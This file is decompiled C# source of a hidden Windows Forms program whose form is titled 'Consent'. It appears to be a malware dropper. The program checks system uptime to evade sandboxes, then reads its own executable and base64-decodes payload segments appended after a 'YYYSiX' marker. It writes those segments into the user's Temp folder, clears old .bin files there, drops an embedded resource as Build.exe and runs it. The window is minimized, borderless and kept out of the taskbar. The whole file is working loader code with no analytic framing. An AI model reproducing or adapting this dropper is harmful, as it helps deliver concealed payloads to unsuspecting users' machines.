using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using UnrealFile.My.Resources;

namespace UnrealFile;

[DesignerGenerated]
public class Form1 : Form
{
	private Random r;

	private IContainer components;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		r = new Random();
		InitializeComponent();
	}

	private object rID()
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ+_~@$-=1234567890";
		string text2 = "." + text[1].ToString().ToLower() + text[8].ToString().ToLower() + text[13].ToString().ToLower();
		int num = r.Next(3, 20);
		string text3 = "";
		int num2 = num;
		checked
		{
			for (int i = 0; i <= num2; i++)
			{
				char c = text[r.Next(0, text.Length - 1)];
				text3 += Conversions.ToString(c);
			}
			return text3 + text2;
		}
	}

	private void Clear()
	{
		int num = 1;
		do
		{
			Convert.ToByte(1E+18 * (double)num);
			num = checked(num + 1);
		}
		while (num <= 999);
		Application.Exit();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		string current = default(string);
		string text = default(string);
		string[] array = default(string[]);
		IEnumerator<string> enumerator = default(IEnumerator<string>);
		int num5 = default(int);
		int num6 = default(int);
		string text2 = default(string);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		byte[] bytes = default(byte[]);
		string path = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					if (Environment.TickCount >= 120000)
					{
						goto IL_0011;
					}
					goto IL_01ab;
				case 573:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0011;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_0034;
						case 6:
							goto IL_003b;
						case 7:
							goto IL_004c;
						case 8:
							goto IL_0069;
						case 9:
							goto IL_0085;
						case 10:
							goto IL_00b9;
						case 11:
							goto IL_00c3;
						case 12:
							goto IL_00cf;
						case 13:
							goto IL_00dd;
						case 14:
							goto IL_00ef;
						case 15:
							goto IL_00fe;
						case 16:
							goto IL_0127;
						case 17:
							goto IL_0133;
						case 18:
							goto IL_0142;
						case 19:
							goto IL_015b;
						case 20:
							goto IL_016a;
						case 21:
							goto IL_0174;
						case 22:
							goto IL_0192;
						case 23:
							goto IL_019e;
						case 25:
							goto IL_01ab;
						case 24:
						case 26:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 27:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00b9:
					num = 10;
					File.Delete(current);
					goto IL_00c3;
					IL_0011:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0018;
					IL_0018:
					num = 3;
					text = File.ReadAllText(Application.get_ExecutablePath());
					goto IL_0025;
					IL_0025:
					num = 4;
					if (!text.Contains("YYYSiX"))
					{
						goto IL_0034;
					}
					goto IL_003b;
					IL_0034:
					num = 5;
					Application.Exit();
					goto IL_003b;
					IL_003b:
					num = 6;
					array = Strings.Split(text, "YYYSiX", -1, (CompareMethod)0);
					goto IL_004c;
					IL_004c:
					num = 7;
					if (!Directory.Exists("C:/Users/" + Environment.UserName + "/AppData/Local/Temp/"))
					{
						goto IL_0069;
					}
					goto IL_0085;
					IL_0069:
					num = 8;
					Directory.CreateDirectory("C:/Users/" + Environment.UserName + "/AppData/Local/Temp/");
					goto IL_0085;
					IL_0085:
					num = 9;
					enumerator = Directory.EnumerateFiles("C:/Users/" + Environment.UserName + "/AppData/Local/Temp/", "*.bin", SearchOption.TopDirectoryOnly).GetEnumerator();
					goto IL_00c6;
					IL_00c6:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						goto IL_00b9;
					}
					goto IL_00cf;
					IL_00cf:
					num = 12;
					enumerator?.Dispose();
					goto IL_00dd;
					IL_01ab:
					num = 25;
					Clear();
					break;
					IL_00dd:
					num = 13;
					num5 = Information.UBound((Array)array, 1);
					num6 = 1;
					goto IL_013c;
					IL_013c:
					if (num6 <= num5)
					{
						goto IL_00ef;
					}
					goto IL_0142;
					IL_0142:
					num = 18;
					text2 = "C:/Users/" + Environment.UserName + "/AppData/Local/Temp/Build.exe";
					goto IL_015b;
					IL_015b:
					num = 19;
					File.WriteAllBytes(text2, Resources.ppppppp);
					goto IL_016a;
					IL_016a:
					num = 20;
					processStartInfo = new ProcessStartInfo();
					goto IL_0174;
					IL_0174:
					num = 21;
					processStartInfo.WorkingDirectory = "C:/Users/" + Environment.UserName + "/AppData/Local/Temp/";
					goto IL_0192;
					IL_0192:
					num = 22;
					processStartInfo.FileName = text2;
					goto IL_019e;
					IL_019e:
					num = 23;
					Process.Start(processStartInfo);
					break;
					IL_00ef:
					num = 14;
					bytes = Convert.FromBase64String(array[num6]);
					goto IL_00fe;
					IL_00fe:
					num = 15;
					path = Conversions.ToString(Operators.ConcatenateObject((object)("C:/Users/" + Environment.UserName + "/AppData/Local/Temp/"), rID()));
					goto IL_0127;
					IL_0127:
					num = 16;
					File.WriteAllBytes(path, bytes);
					goto IL_0133;
					IL_0133:
					num = 17;
					num6 = checked(num6 + 1);
					goto IL_013c;
					IL_00c3:
					num = 11;
					goto IL_00c6;
					end_IL_0000_2:
					break;
				}
				num = 26;
				Application.Exit();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 573;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(329, 262));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Consent");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}
}
